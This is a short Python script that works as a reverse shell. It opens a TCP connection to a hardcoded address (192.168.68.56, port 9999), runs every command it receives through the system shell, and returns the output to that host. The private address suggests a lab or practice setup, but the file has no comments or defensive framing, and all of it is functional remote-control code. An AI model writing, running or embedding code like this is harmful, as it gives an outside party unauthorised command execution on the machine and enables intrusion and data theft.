import socket
import subprocess

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_ip = '192.168.68.56'
server_port = 9999
client_socket.connect((server_ip, server_port))


while True:
    received_data = client_socket.recv(1024)
    if not received_data:
        break
    completed_process = subprocess.run(
        received_data.decode('utf-8'),
        shell=True,
        stdout=subprocess.PIPE,  
        stderr=subprocess.PIPE,  
        text=True,  
        universal_newlines=True  
    )
    if completed_process.returncode == 0:
        output = completed_process.stdout
        client_socket.send(output.encode('utf-8'))
    else:
        error_message = completed_process.stderr
        client_socket.send(error_message.encode('utf-8'))

client_socket.close()
